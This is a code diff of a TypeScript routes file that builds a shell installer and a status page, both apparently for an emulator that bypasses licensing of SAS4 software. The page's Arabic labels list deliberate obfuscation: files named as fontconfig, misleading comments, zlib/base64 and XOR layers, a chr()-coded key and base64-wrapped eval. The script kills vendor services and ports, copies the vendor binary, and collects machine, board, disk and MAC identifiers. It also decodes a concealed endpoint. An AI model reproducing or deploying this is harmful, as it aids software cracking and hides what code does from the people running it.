@@ -675,8 +675,8 @@ export async function registerRoutes(
             { label: "نمط المفتاح", value: "Gr3nd1z3r + (الساعة الحالية + 1) = مفتاح يتغير كل ساعة" },
             { label: "التشفير على العميل", value: "المفتاح يُبنى من chr() codes: [71,114,51,110,100,49,122,51,114] + ساعة محلية" },
             { label: "طبقات التمويه", value: "1) أسماء ملفات fontconfig  2) تعليقات مضللة  3) ضغط zlib+base64  4) متغيرات بحرف واحد  5) بيانات XOR  6) مفتاح من chr() codes  7) verify مغلف بـ base64 eval" },
-            { label: "بورت الإيميوليتر", value: "4000 (جميع الواجهات 0.0.0.0)" },
-            { label: "استعلام SAS4", value: "http://127.0.0.1:4000/?op=get", mono: true },
+            { label: "بورت الإيميوليتر", value: "4001 (جميع الواجهات 0.0.0.0)" },
+            { label: "استعلام SAS4", value: "http://127.0.0.1:4001/?op=get", mono: true },
             { label: "كاش الإيميوليتر", value: "5 دقائق - يحفظ payload مؤقتاً لتقليل الطلبات للسلطة" },
           ],
         }),
@@ -1159,9 +1159,8 @@ _SU="${baseUrl}"
 systemctl stop $_SM $_SV.timer $_SV 2>/dev/null || true
 systemctl stop \${_PS}.timer \${_PS} 2>/dev/null || true
 systemctl stop sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true
-killall -9 sas_sspd 2>/dev/null || true
-fuser -k 4000/tcp 2>/dev/null || true
-sleep 2
+fuser -k 4001/tcp 2>/dev/null || true
+sleep 1
 
 mkdir -p "$_P"
 mkdir -p "$_PD"
@@ -1170,36 +1169,14 @@ if [ -f "/opt/sas4/bin/sas_sspd" ] && [ ! -f "$_P/$_B" ]; then
   cp /opt/sas4/bin/sas_sspd "$_P/$_B" && chmod +x "$_P/$_B"
 fi
 
-_HW=""
-_SHOST="${serverHost}"
-if [ -n "$_SHOST" ] && [ -f "$_P/$_B" ]; then
-  "$_P/$_B" > /dev/null 2>&1 &
-  _PID=$!; sleep 5
-  _BL=$(curl -s "http://\${_SHOST}:4000/?op=get" 2>/dev/null)
-  kill $_PID 2>/dev/null
-  if [ -n "$_BL" ]; then
-    _HW=$(python3 -c "$(echo '${hwidPyB64}' | base64 -d)" "$_BL" 2>/dev/null)
-  fi
-elif [ -f "$_P/$_B" ]; then
-  "$_P/$_B" > /dev/null 2>&1 &
-  _PID=$!; sleep 5
-  _BL=$(curl -s "http://127.0.0.1:4000/?op=get" 2>/dev/null)
-  kill $_PID 2>/dev/null
-  if [ -n "$_BL" ]; then
-    _HW=$(python3 -c "$(echo '${hwidPyB64}' | base64 -d)" "$_BL" 2>/dev/null)
-  fi
-fi
-
-if [ -z "$_HW" ] || [ "$_HW" = "N/A" ]; then
-  _MI=$(cat /etc/machine-id 2>/dev/null || echo "")
-  _PU=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null || echo "")
-  _MA=$(ip link show 2>/dev/null | grep -m1 'link/ether' | awk '{print \\$2}' || echo "")
-  _BS=$(cat /sys/class/dmi/id/board_serial 2>/dev/null || echo "")
-  _CS=$(cat /sys/class/dmi/id/chassis_serial 2>/dev/null || echo "")
-  _DS=$(lsblk --nodeps -no serial 2>/dev/null | head -1 || echo "")
-  _CI=$(grep -m1 'Serial' /proc/cpuinfo 2>/dev/null | awk '{print \\$3}' || cat /sys/class/dmi/id/product_serial 2>/dev/null || echo "")
-  _HW=$(echo -n "\${_MI}:\${_PU}:\${_MA}:\${_BS}:\${_CS}:\${_DS}:\${_CI}" | sha256sum | awk '{print substr(\\$1,1,16)}')
-fi
+_MI=$(cat /etc/machine-id 2>/dev/null || echo "")
+_PU=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null || echo "")
+_MA=$(ip link show 2>/dev/null | grep -m1 'link/ether' | awk '{print \\$2}' || echo "")
+_BS=$(cat /sys/class/dmi/id/board_serial 2>/dev/null || echo "")
+_CS=$(cat /sys/class/dmi/id/chassis_serial 2>/dev/null || echo "")
+_DS=$(lsblk --nodeps -no serial 2>/dev/null | head -1 || echo "")
+_CI=$(grep -m1 'Serial' /proc/cpuinfo 2>/dev/null | awk '{print \\$3}' || cat /sys/class/dmi/id/product_serial 2>/dev/null || echo "")
+_HW=$(echo -n "\${_MI}:\${_PU}:\${_MA}:\${_BS}:\${_CS}:\${_DS}:\${_CI}" | sha256sum | awk '{print substr(\\$1,1,16)}')
 
 _EP=$(echo '${provisionEp}' | base64 -d)
 
